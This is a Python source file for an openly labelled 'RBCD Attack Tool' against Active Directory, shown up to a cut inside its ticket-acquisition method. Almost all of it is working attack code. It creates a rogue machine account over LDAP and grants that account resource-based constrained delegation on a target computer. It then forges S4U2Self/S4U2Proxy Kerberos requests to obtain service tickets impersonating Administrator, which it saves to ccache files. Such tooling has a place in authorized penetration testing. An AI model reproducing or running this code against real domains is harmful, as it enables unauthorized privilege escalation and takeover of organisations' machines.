#!/usr/bin/env python3


import sys
import os
import time
import re
import signal
import logging
import random
import datetime
import struct
import ssl
from pathlib import Path
from typing import Optional, List, Tuple, Dict, Any
from binascii import hexlify, unhexlify
from six import ensure_binary

from colorama import Fore, Style, init
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD, MODIFY_DELETE, MODIFY_REPLACE, SUBTREE, Tls
from ldap3.core.exceptions import LDAPBindError
from ldap3.protocol.formatters.formatters import format_sid

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket.krb5.ccache import CCache
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AS_REP, TGS_REQ, TGS_REP, Ticket as TicketAsn1,
    EncTGSRepPart, AP_REQ, Authenticator,
    seq_set, seq_set_iter,
    PA_FOR_USER_ENC, PA_PAC_OPTIONS
)
from impacket.krb5.crypto import Key, _HMACMD5
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
from impacket.ldap import ldaptypes


# ─────────────────────────────────────────────────────────────────────────────
# INIT
# ─────────────────────────────────────────────────────────────────────────────
init(autoreset=True)
logging.getLogger().setLevel(logging.ERROR)


# ─────────────────────────────────────────────────────────────────────────────
# SIGNAL HANDLER
# ─────────────────────────────────────────────────────────────────────────────
def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)


# ─────────────────────────────────────────────────────────────────────────────
# BANNER
# ─────────────────────────────────────────────────────────────────────────────
def banner():
    print(Fore.CYAN + """
    ╔══════════════════════════════════════════════════════════════╗
    ║                     RBCD Attack Tool                         ║
    ║  Resource-Based Constrained Delegation via LDAP & Kerberos   ║
    ╚══════════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)


# ─────────────────────────────────────────────────────────────────────────────
# VALIDATORS
# ─────────────────────────────────────────────────────────────────────────────
def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def validate_password(password):
    return len(password) >= 7


def validate_hash(hash_str):
    if ':' in hash_str:
        parts = hash_str.split(':')
        if len(parts) == 2:
            lm, nt = parts
            return len(lm) == 32 and len(nt) == 32 and all(c in '0123456789abcdefABCDEF' for c in lm + nt)
        return False
    else:
        return len(hash_str) == 32 and all(c in '0123456789abcdefABCDEF' for c in hash_str)


# ─────────────────────────────────────────────────────────────────────────────
# INPUT HELPER
# ─────────────────────────────────────────────────────────────────────────────
def get_input(prompt, validator=None, error_msg=None, allow_empty=False, default=""):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                if default:
                    return default
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if not value and allow_empty:
                return default
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)


# ─────────────────────────────────────────────────────────────────────────────
# UTILITY FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────
def get_base_dn(domain):
    return ','.join([f"DC={part}" for part in domain.split('.')])


def check_ip_reachable(ip):
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, 636))
        sock.close()
        if result == 0:
            return True
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, 389))
        sock.close()
        return result == 0
    except Exception:
        return False


def check_credentials_and_domain(dc_ip, domain, username, password, auth_type='password', lmhash='', nthash='', ticket_file=''):
    if auth_type == 'password':
        try:
            base_dn = get_base_dn(domain)
            tls = Tls(validate=ssl.CERT_NONE)
            server = Server(dc_ip, port=636, use_ssl=True, tls=tls, get_info=ALL, connect_timeout=5)
            conn = Connection(
                server,
                user=f"{domain}\\{username}",
                password=password,
                authentication=NTLM,
                auto_bind=True
            )
            conn.search(
                search_base=base_dn,
                search_filter='(objectClass=domain)',
                search_scope=SUBTREE,
                attributes=['dc']
            )
            result = len(conn.entries) > 0
            conn.unbind()
            return result
        except LDAPBindError:
            return "invalid_credentials"
        except Exception:
            try:
                base_dn = get_base_dn(domain)
                server = Server(dc_ip, get_info=ALL, connect_timeout=5)
                conn = Connection(
                    server,
                    user=f"{domain}\\{username}",
                    password=password,
                    authentication=NTLM,
                    auto_bind=True
                )
                conn.search(
                    search_base=base_dn,
                    search_filter='(objectClass=domain)',
                    search_scope=SUBTREE,
                    attributes=['dc']
                )
                result = len(conn.entries) > 0
                conn.unbind()
                return result
            except LDAPBindError:
                return "invalid_credentials"
            except Exception:
                return False
    else:
        try:
            from impacket.dcerpc.v5 import transport, samr
            string_binding = f'ncacn_np:{dc_ip}[\\pipe\\samr]'
            tr = transport.DCERPCTransportFactory(string_binding)

            if auth_type == 'hash':
                tr.set_credentials(username, '', domain, lmhash, nthash)
            elif auth_type == 'ticket':
                tr.set_credentials(username, '', domain, '', '')
                tr.set_kerberos(True, kdcHost=dc_ip)
                if ticket_file and os.path.exists(ticket_file):
                    os.environ['KRB5CCNAME'] = ticket_file

            dce = tr.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp = samr.hSamrConnect(dce)
            server_hd = resp['ServerHandle']

            resp = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain.split('.')[0].upper())

            samr.hSamrCloseHandle(dce, server_hd)
            dce.disconnect()
            return True
        except Exception as e:
            err = str(e).lower()
            if any(x in err for x in ['logon failure', 'access_denied', 'invalid_credentials', 'status_logon_failure', 'sec_e_logon_denied']):
                return "invalid_credentials"
            return False


# ─────────────────────────────────────────────────────────────────────────────
# LDAP CLIENT
# ─────────────────────────────────────────────────────────────────────────────
class LDAPClient:
    def __init__(self, dc_ip, domain, username, password, auth_type='password', lmhash='', nthash='', ticket_file=''):
        self.dc_ip = dc_ip
        self.domain = domain
        self.username = username
        self.password = password
        self.auth_type = auth_type
        self.lmhash = lmhash
        self.nthash = nthash
        self.ticket_file = ticket_file
        self.base_dn = get_base_dn(domain)
        self.conn = None

    def connect(self):
        if self.auth_type != 'password':
            return False
        try:
            tls = Tls(validate=ssl.CERT_NONE)
            server = Server(self.dc_ip, port=636, use_ssl=True, tls=tls, get_info=ALL, connect_timeout=5)
            self.conn = Connection(
                server,
                user=f"{self.domain}\\{self.username}",
                password=self.password,
                authentication=NTLM,
                auto_bind=True
            )
            print(Fore.GREEN + "[+] Connected via LDAPS (port 636)" + Style.RESET_ALL)
            return True
        except Exception:
            pass
        try:
            server = Server(self.dc_ip, get_info=ALL, connect_timeout=5)
            self.conn = Connection(
                server,
                user=f"{self.domain}\\{self.username}",
                password=self.password,
                authentication=NTLM,
                auto_bind=True
            )
            print(Fore.YELLOW + "[!] Connected via LDAP (port 389) - some operations may require LDAPS" + Style.RESET_ALL)
            return True
        except LDAPBindError:
            print(Fore.RED + "[-] Invalid credentials!" + Style.RESET_ALL)
            return False
        except Exception as e:
            print(Fore.RED + f"[-] LDAP connection failed: {e}" + Style.RESET_ALL)
            return False

    def disconnect(self):
        if self.conn:
            try:
                self.conn.unbind()
            except:
                pass

    def search(self, filter_str, attributes=None):
        if not self.conn:
            return []
        try:
            self.conn.search(self.base_dn, filter_str, search_scope=SUBTREE, attributes=attributes or ['*'])
            results = []
            for entry in self.conn.entries:
                result_dict = {'dn': entry.entry_dn, 'attributes': {}}
                for attr in entry.entry_attributes:
                    result_dict['attributes'][attr] = entry[attr].value
                results.append(result_dict)
            return results
        except Exception as e:
            print(Fore.RED + f"[-] LDAP search failed: {e}" + Style.RESET_ALL)
            return []

    def get_computer_info(self, computer_name):
        filter_str = f"(&(objectClass=computer)(sAMAccountName={computer_name}$))"
        results = self.search(filter_str, attributes=['dNSHostName', 'servicePrincipalName', 'distinguishedName', 'objectSid'])
        return results[0] if results else None

    def enumerate_computers(self):
        filter_str = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        results = self.search(filter_str, attributes=['sAMAccountName'])
        computers = []
        for result in results:
            sam = result['attributes'].get('sAMAccountName', '')
            if sam and sam.endswith('$'):
                computers.append(sam.rstrip('$'))
        return computers

    def modify_attribute(self, dn, attribute, operation, values):
        if not self.conn:
            return False
        try:
            self.conn.modify(dn, {attribute: [(operation, values)]})
            if self.conn.result['result'] == 0:
                return True
            print(Fore.YELLOW + f"[!] LDAP modify failed: {self.conn.result['description']}" + Style.RESET_ALL)
            return False
        except Exception as e:
            print(Fore.RED + f"[-] LDAP modify error: {e}" + Style.RESET_ALL)
            return False

    def add_object(self, dn, object_class, attributes):
        if not self.conn:
            return False
        try:
            self.conn.add(dn, object_class=object_class, attributes=attributes)
            if self.conn.result['result'] == 0:
                return True
            desc = str(self.conn.result.get('description', ''))
            if 'entryAlreadyExists' in desc or 'ENTRY_ALREADY_EXISTS' in desc:
                print(Fore.YELLOW + f"[!] Object already exists: {dn}" + Style.RESET_ALL)
                return "exists"
            print(Fore.YELLOW + f"[!] LDAP add failed: {self.conn.result['description']}" + Style.RESET_ALL)
            return False
        except Exception as e:
            print(Fore.RED + f"[-] LDAP add error: {e}" + Style.RESET_ALL)
            return False

    def delete_object(self, dn):
        if not self.conn:
            return False
        try:
            self.conn.delete(dn)
            if self.conn.result['result'] == 0:
                return True
            print(Fore.YELLOW + f"[!] LDAP delete failed: {self.conn.result['description']}" + Style.RESET_ALL)
            return False
        except Exception as e:
            print(Fore.RED + f"[-] LDAP delete error: {e}" + Style.RESET_ALL)
            return False


# ─────────────────────────────────────────────────────────────────────────────
# SECURITY DESCRIPTOR HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def create_empty_sd():
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772
    sd['OwnerSid'] = ldaptypes.LDAP_SID()
    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
    sd['GroupSid'] = b''
    sd['Sacl'] = b''
    acl = ldaptypes.ACL()
    acl['AclRevision'] = 4
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0
    acl.aces = []
    sd['Dacl'] = acl
    return sd


def create_allow_ace(sid_str):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = 983551
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid_str)
    nace['Ace'] = acedata
    return nace


# ─────────────────────────────────────────────────────────────────────────────
# AD OPERATIONS
# ─────────────────────────────────────────────────────────────────────────────
class ADOperations:
    def __init__(self, dc_ip, domain, username, password, auth_type='password', lmhash='', nthash='', ticket_file=''):
        self.dc_ip = dc_ip
        self.domain = domain
        self.username = username
        self.password = password
        self.auth_type = auth_type
        self.lmhash = lmhash
        self.nthash = nthash
        self.ticket_file = ticket_file
        self.ldap = LDAPClient(dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file)

    def create_computer_account(self, computer_name, computer_password):
        if not self.ldap.connect():
            return False
        try:
            computer_sam = computer_name.rstrip('$')
            base_dn = get_base_dn(self.domain)
            computer_dn = f"CN={computer_sam},CN=Computers,{base_dn}"
            base_attrs = {
                'objectClass': ['top', 'person', 'organizationalPerson', 'user', 'computer'],
                'sAMAccountName': computer_name,
                'userAccountControl': 4096,
            }
            result = self.ldap.add_object(computer_dn, ['computer'], base_attrs)
            if result == "exists":
                print(Fore.YELLOW + f"[!] Computer already exists, reusing: {computer_name}" + Style.RESET_ALL)
            elif not result:
                return False

            if not self.ldap.modify_attribute(
                computer_dn, 'unicodePwd', MODIFY_REPLACE,
                [f'"{computer_password}"'.encode('utf-16-le')]
            ):
                print(Fore.RED + "[-] Failed to set computer password (ensure LDAPS on port 636)" + Style.RESET_ALL)
                return False

            self.ldap.modify_attribute(computer_dn, 'dNSHostName', MODIFY_REPLACE, [f"{computer_sam}.{self.domain}"])
            self.ldap.modify_attribute(
                computer_dn, 'servicePrincipalName', MODIFY_REPLACE,
                [
                    f'HOST/{computer_sam}',
                    f'HOST/{computer_sam}.{self.domain}',
                    f'RestrictedKrbHost/{computer_sam}',
                    f'RestrictedKrbHost/{computer_sam}.{self.domain}',
                ]
            )
            print(Fore.GREEN + f"[+] Computer account created: {computer_name}" + Style.RESET_ALL)
            return True
        except Exception as e:
            print(Fore.RED + f"[-] Computer creation error: {e}" + Style.RESET_ALL)
            return False
        finally:
            self.ldap.disconnect()

    def set_rbcd_delegation(self, delegate_from, delegate_to):
        if not self.ldap.connect():
            return False
        try:
            target_filter = f"(sAMAccountName={delegate_to.rstrip('$')}$)"
            self.ldap.conn.search(
                self.ldap.base_dn,
                target_filter,
                search_scope=SUBTREE,
                attributes=['sAMAccountName', 'msDS-AllowedToActOnBehalfOfOtherIdentity']
            )
            target_entry = None
            for entry in self.ldap.conn.response:
                if entry.get('type') == 'searchResEntry':
                    target_entry = entry
                    break
            if not target_entry:
                print(Fore.RED + f"[-] Target not found: {delegate_to}" + Style.RESET_ALL)
                return False
            target_dn = target_entry['dn']

            delegate_filter = f"(sAMAccountName={delegate_from.rstrip('$')}$)"
            self.ldap.conn.search(
                self.ldap.base_dn,
                delegate_filter,
                search_scope=SUBTREE,
                attributes=['objectSid']
            )
            delegate_entry = None
            for entry in self.ldap.conn.response:
                if entry.get('type') == 'searchResEntry':
                    delegate_entry = entry
                    break
            if not delegate_entry:
                print(Fore.RED + f"[-] Delegate not found: {delegate_from}" + Style.RESET_ALL)
                return False

            raw_sid_bytes = delegate_entry['raw_attributes']['objectSid'][0]
            sid_str = format_sid(raw_sid_bytes)
            print(Fore.BLUE + f"[*] SID: {sid_str}" + Style.RESET_ALL)

            existing_sd_raw = target_entry['raw_attributes'].get(
                'msDS-AllowedToActOnBehalfOfOtherIdentity', [b'']
            )
            if existing_sd_raw and existing_sd_raw[0]:
                sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=existing_sd_raw[0])
                print(Fore.BLUE + "[*] Loaded existing Security Descriptor" + Style.RESET_ALL)
            else:
                sd = create_empty_sd()
                print(Fore.BLUE + "[*] Created new empty Security Descriptor" + Style.RESET_ALL)

            existing_sids = [
                ace['Ace']['Sid'].formatCanonical()
                for ace in sd['Dacl'].aces
            ]
            if sid_str not in existing_sids:
                sd['Dacl'].aces.append(create_allow_ace(sid_str))
                print(Fore.BLUE + f"[*] ACE added for SID: {sid_str}" + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + f"[!] SID {sid_str} already present — no changes needed" + Style.RESET_ALL)

            self.ldap.conn.modify(
                target_dn,
                {'msDS-AllowedToActOnBehalfOfOtherIdentity': [
                    (MODIFY_REPLACE, [sd.getData()])
                ]}
            )
            if self.ldap.conn.result['result'] == 0:
                print(Fore.GREEN + f"[+] RBCD set: {delegate_from} → {delegate_to}" + Style.RESET_ALL)
                return True
            else:
                print(Fore.RED + f"[-] LDAP modify failed: {self.ldap.conn.result['description']}" + Style.RESET_ALL)
                return False
        except Exception as e:
            print(Fore.RED + f"[-] RBCD delegation error: {e}" + Style.RESET_ALL)
            return False
        finally:
            self.ldap.disconnect()

    def delete_computer_account(self, computer_name):
        if not self.ldap.connect():
            return False
        try:
            computer_sam = computer_name.rstrip('$')
            base_dn = get_base_dn(self.domain)
            computer_dn = f"CN={computer_sam},CN=Computers,{base_dn}"
            if self.ldap.delete_object(computer_dn):
                print(Fore.GREEN + f"[+] Computer account deleted: {computer_name}" + Style.RESET_ALL)
                return True
            return False
        except Exception as e:
            print(Fore.YELLOW + f"[!] Computer deletion error: {e}" + Style.RESET_ALL)
            return False
        finally:
            self.ldap.disconnect()

    def remove_rbcd_delegation(self, delegate_from, delegate_to):
        if not self.ldap.connect():
            return False
        try:
            target_info = self.ldap.get_computer_info(delegate_to.rstrip('$'))
            if not target_info:
                return False
            target_dn = target_info['dn']
            self.ldap.modify_attribute(
                target_dn,
                'msDS-AllowedToActOnBehalfOfOtherIdentity',
                MODIFY_DELETE, []
            )
            print(Fore.GREEN + "[+] RBCD delegation removed" + Style.RESET_ALL)
            return True
        except Exception as e:
            print(Fore.YELLOW + f"[!] RBCD removal error: {e}" + Style.RESET_ALL)
            return False
        finally:
            self.ldap.disconnect()


# ─────────────────────────────────────────────────────────────────────────────
# S4U HELPER
# ─────────────────────────────────────────────────────────────────────────────
class S4UHelper:
    def __init__(self, domain, dc_host, machine_sam, machine_password):
        self.domain = domain
        self.dc_host = dc_host
        self.machine_sam = machine_sam
        self.machine_password = machine_password

    def _build_ap_req(self, tgt_raw, cipher, session_key):
        decoded_tgt = decoder.decode(tgt_raw, asn1Spec=AS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(decoded_tgt['ticket'])

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decoded_tgt['crealm'])
        client_name = Principal()
        client_name.from_asn1(decoded_tgt, 'crealm', 'cname')
        seq_set(authenticator, 'cname', client_name.components_to_asn1)
        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        enc_auth = cipher.encrypt(session_key, 7, encoder.encode(authenticator), None)

        ap_req = AP_REQ()
        ap_req['pvno'] = 5
        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap_req['ap-options'] = constants.encodeFlags([])
        seq_set(ap_req, 'ticket', ticket.to_asn1)
        ap_req['authenticator'] = noValue
        ap_req['authenticator']['etype'] = cipher.enctype
        ap_req['authenticator']['cipher'] = enc_auth
        return encoder.encode(ap_req)

    def _s4u2self(self, tgt_raw, cipher, session_key, impersonate):
        ap_req_encoded = self._build_ap_req(tgt_raw, cipher, session_key)
        decoded_tgt = decoder.decode(tgt_raw, asn1Spec=AS_REP())[0]

        client_name = Principal(impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        s4u_data = (
            struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
            + ensure_binary(impersonate)
            + ensure_binary(self.domain)
            + b'Kerberos'
        )
        checksum = _HMACMD5.checksum(session_key, 17, s4u_data)

        pa_for_user = PA_FOR_USER_ENC()
        seq_set(pa_for_user, 'userName', client_name.components_to_asn1)
        pa_for_user['userRealm'] = self.domain
        pa_for_user['cksum'] = noValue
        pa_for_user['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        pa_for_user['cksum']['checksum'] = checksum
        pa_for_user['auth-package'] = 'Kerberos'

        tgs_req = TGS_REQ()
        tgs_req['pvno'] = 5
        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgs_req['padata'] = noValue
        tgs_req['padata'][0] = noValue
        tgs_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgs_req['padata'][0]['padata-value'] = ap_req_encoded
        tgs_req['padata'][1] = noValue
        tgs_req['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgs_req['padata'][1]['padata-value'] = encoder.encode(pa_for_user)

        req_body = seq_set(tgs_req, 'req-body')
        opts = [
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.canonicalize.value,
        ]
        req_body['kdc-options'] = constants.encodeFlags(opts)

        server_name = Principal(self.machine_sam, type=constants.PrincipalNameType.NT_UNKNOWN.value)
        seq_set(req_body, 'sname', server_name.components_to_asn1)
        req_body['realm'] = str(decoded_tgt['crealm'])
        req_body['till'] = KerberosTime.to_asn1(
            datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        )
        req_body['nonce'] = random.getrandbits(31)
        seq_set_iter(req_body, 'etype', (
            int(cipher.enctype),
            int(constants.EncryptionTypes.rc4_hmac.value),
        ))

        print(Fore.BLUE + "[*] Sending S4U2Self request to KDC..." + Style.RESET_ALL)
        return sendReceive(encoder.encode(tgs_req), self.domain, self.dc_host)

    def _s4u2proxy(self, tgt_raw, cipher, session_key, tgs_self_raw, spn):
        ap_req_encoded = self._build_ap_req(tgt_raw, cipher, session_key)
        decoded_tgt = decoder.decode(tgt_raw, asn1Spec=AS_REP())[0]
        decoded_self = decoder.decode(tgs_self_raw, asn1Spec=TGS_REP())[0]

        ticket_self = Ticket()
        ticket_self.from_asn1(decoded_self['ticket'])

        pa_pac_options = PA_PAC_OPTIONS()
        pa_pac_options['flags'] = constants.encodeFlags(
            (constants.PAPacOptions.resource_based_constrained_delegation.value,)
        )

        tgs_req = TGS_REQ()
        tgs_req['pvno'] = 5
        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgs_req['padata'] = noValue
        tgs_req['padata'][0] = noValue
        tgs_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgs_req['padata'][0]['padata-value'] = ap_req_encoded
        tgs_req['padata'][1] = noValue
        tgs_req['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value)
        tgs_req['padata'][1]['padata-value'] = encoder.encode(pa_pac_options)

        req_body = seq_set(tgs_req, 'req-body')
        opts = [
            constants.KDCOptions.cname_in_addl_tkt.value,
            constants.KDCOptions.canonicalize.value,
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
        ]
        req_body['kdc-options'] = constants.encodeFlags(opts)

        service_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(req_body, 'sname', service_name.components_to_asn1)
        req_body['realm'] = self.domain
        req_body['till'] = KerberosTime.to_asn1(
            datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        )
        req_body['nonce'] = random.getrandbits(31)
        seq_set_iter(req_body, 'etype', (
            int(constants.EncryptionTypes.rc4_hmac.value),
            int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
            int(constants.EncryptionTypes.des_cbc_md5.value),
            int(cipher.enctype),
        ))
        my_ticket = ticket_self.to_asn1(TicketAsn1())
        seq_set_iter(req_body, 'additional-tickets', (my_ticket,))

        print(Fore.BLUE + f"[*] Sending S4U2Proxy request for SPN: {spn}" + Style.RESET_ALL)
        return sendReceive(encoder.encode(tgs_req), self.domain, self.dc_host)

    def do_s4u(self, tgt_raw, cipher, old_session_key, session_key, impersonate, spns):
        print(Fore.BLUE + f"[*] Executing S4U2Self for {impersonate}..." + Style.RESET_ALL)
        tgs_self_raw = self._s4u2self(tgt_raw, cipher, session_key, impersonate)
        print(Fore.GREEN + "[+] S4U2Self ticket obtained" + Style.RESET_ALL)

        for spn in spns:
            try:
                print(Fore.BLUE + f"[*] Trying S4U2Proxy → {spn}" + Style.RESET_ALL)
                tgs_proxy_raw = self._s4u2proxy(tgt_raw, cipher, session_key, tgs_self_raw, spn)
                print(Fore.GREEN + f"[+] Service ticket acquired for: {spn}" + Style.RESET_ALL)
                return tgs_proxy_raw, session_key
            except Exception as e:
                print(Fore.YELLOW + f"[!] S4U2Proxy failed for {spn}: {e}" + Style.RESET_ALL)

        raise Exception("All SPNs failed during S4U2Proxy")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN RBCD ATTACK CLASS
# ─────────────────────────────────────────────────────────────────────────────
class RBCDAttack:
    def __init__(self):
        self.domain = ""
        self.username = ""
        self.password = ""
        self.dc_ip = ""
        self.target = ""
        self.impersonate = "Administrator"
        self.target_fqdn = ""
        self.target_real_spns = []
        self.computer_name = ""
        self.computer_sam = ""
        self.computer_password = ""
        self.tgt_ccache = ""
        self.ticket_file = ""
        self.auth_type = 'password'
        self.lmhash = ''
        self.nthash = ''
        self.ticket_file_auth = ''
        self.ad_ops = None

    def _choose_target(self):
        print(Fore.BLUE + "[*] Enumerating domain computers..." + Style.RESET_ALL)
        try:
            ldap = LDAPClient(self.dc_ip, self.domain, self.username, self.password, self.auth_type, self.lmhash, self.nthash, self.ticket_file_auth)
            if not ldap.connect():
                print(Fore.YELLOW + "[!] Could not enumerate computers via LDAP" + Style.RESET_ALL)
                self.target = get_input(
                    Fore.CYAN + "[?] Enter target computer name manually: " + Style.RESET_ALL
                ).rstrip("$")
                return
            computers = ldap.enumerate_computers()
            ldap.disconnect()
            if computers:
                print(Fore.GREEN + f"[+] Found {len(computers)} computer(s):" + Style.RESET_ALL)
                for i, c in enumerate(computers[:20], 1):
                    print(Fore.WHITE + f"    {i:2}. {c}" + Style.RESET_ALL)

                raw = get_input(
                    Fore.CYAN + "\n[?] Enter target name or number: " + Style.RESET_ALL,
                    allow_empty=True
                )

                if raw.isdigit() and 1 <= int(raw) <= len(computers):
                    self.target = computers[int(raw) - 1]
                elif raw:
                    self.target = raw.rstrip("$")
                else:
                    self.target = get_input(
                        Fore.CYAN + "[?] Enter target computer name manually: " + Style.RESET_ALL
                    ).rstrip("$")
            else:
                print(Fore.YELLOW + "[!] No computers found." + Style.RESET_ALL)
                self.target = get_input(
                    Fore.CYAN + "[?] Enter target computer name manually: " + Style.RESET_ALL
                ).rstrip("$")
        except Exception as e:
            print(Fore.YELLOW + f"[!] Enumeration error: {e}" + Style.RESET_ALL)
            self.target = get_input(
                Fore.CYAN + "[?] Enter target computer name manually: " + Style.RESET_ALL
            ).rstrip("$")

    def recon_ad(self):
        print(Fore.BLUE + f"[*] Querying AD for {self.target}$ attributes..." + Style.RESET_ALL)
        try:
            ldap = LDAPClient(self.dc_ip, self.domain, self.username, self.password, self.auth_type, self.lmhash, self.nthash, self.ticket_file_auth)
            if not ldap.connect():
                print(Fore.YELLOW + "[!] AD recon: could not connect" + Style.RESET_ALL)
                self.target_fqdn = f"{self.target}.{self.domain}".lower()
                return
            info = ldap.get_computer_info(self.target)
            ldap.disconnect()
            if info:
                fqdn = info.get('attributes', {}).get('dNSHostName')
                if fqdn:
                    self.target_fqdn = fqdn.lower()
                    print(Fore.GREEN + f"[+] Real FQDN: {self.target_fqdn}" + Style.RESET_ALL)
                spns = info.get('attributes', {}).get('servicePrincipalName', [])
                if isinstance(spns, str):
                    spns = [spns]
                self.target_real_spns = [s.lower() for s in spns] if spns else []
            if not self.target_fqdn:
                self.target_fqdn = f"{self.target}.{self.domain}".lower()
                print(Fore.YELLOW + f"[!] FQDN fallback: {self.target_fqdn}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.YELLOW + f"[!] AD recon error: {e}" + Style.RESET_ALL)
            self.target_fqdn = f"{self.target}.{self.domain}".lower()

    def create_computer(self):
        ts = str(int(time.time()))[-6:]
        self.computer_sam = f"RBCD{ts}"
        self.computer_name = f"{self.computer_sam}$"
        self.computer_password = f"Rb@{ts}X!z9#Q"
        print(Fore.BLUE + f"[*] Creating machine account: {self.computer_name}" + Style.RESET_ALL)
        if not self.ad_ops:
            print(Fore.RED + "[-] AD operations not initialized" + Style.RESET_ALL)
            return False
        return self.ad_ops.create_computer_account(self.computer_name, self.computer_password)

    def set_rbcd(self):
        print(Fore.BLUE + "[*] Configuring RBCD delegation..." + Style.RESET_ALL)
        if not self.ad_ops:
            print(Fore.RED + "[-] AD operations not initialized" + Style.RESET_ALL)
            return False
        return self.ad_ops.set_rbcd_delegation(self.computer_name, f"{self.target}$")

    def get_tgt(self):
        print(Fore.BLUE + f"[*] Requesting TGT for {self.computer_sam}..." + Style.RESET_ALL)
        user_name = Principal(
            self.computer_sam,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            clientName=user_name,
            password=self.computer_password,
            domain=self.domain,
            lmhash=b'',
            nthash=b'',
            aesKey='',
            kdcHost=self.dc_ip
        )
        print(Fore.GREEN + "[+] TGT acquired successfully" + Style.RESET_ALL)
        return tgt, cipher, old_session_key, session_key

    def save_tgt(self, tgt, old_session_key, session_key):
        try:
            ccache = CCache()
            ccache.fromTGT(tgt, old_session_key, session_key)
            ccache.saveFile(str(self.tgt_ccache))
            print(Fore.GREEN + f"[+] TGT saved to: {self.tgt_ccache}" + Style.RESET_ALL)
            return True
        except Exception as e:
            print(Fore.RED + f"[-] Failed to save TGT: {e}" + Style.RESET_ALL)
            return False

    def get_st(self, tgt, cipher, old_session_key, session_key):
        spns = [
            f'cifs/{self.target_fqdn}',
            f'host/{self.target_fqdn}',
            f'cifs/{self.target.upper()}',
            f'host/{self.target.upper()}',
        ]
        helper = S4UHelper(
            self.domain, self.dc_ip,
            self.computer_sam, self.computer_password
        )
        return helper.do_s4u(tgt, cipher, old_session_key, session_key, self.impersonate, spns)

    def save_ticket(self, tgs_raw, session_key):
        try:
            ccache = CCache()
            ccache.fromTGS(tgs_raw, session_key, session_key)
            ccache.saveFile(self.ticket_file)
            print(Fore.GREEN + f"[+] Ticket saved to: {self.ticket_file}" + Style.RESET_ALL)
            return True
        except Exception as e:
            print(Fore.RED + f"[-] Failed to save ticket: {e}" + Style.RESET_ALL)
            return False

    def get_ticket(self):
        try:
            print(Fore.BLUE + "[*] Starting Kerberos ticket acquisition..." + Style.RESET_ALL)
            self.tgt_ccache = Path(f"{self.computer_sam.upper()}.ccache").resolve()
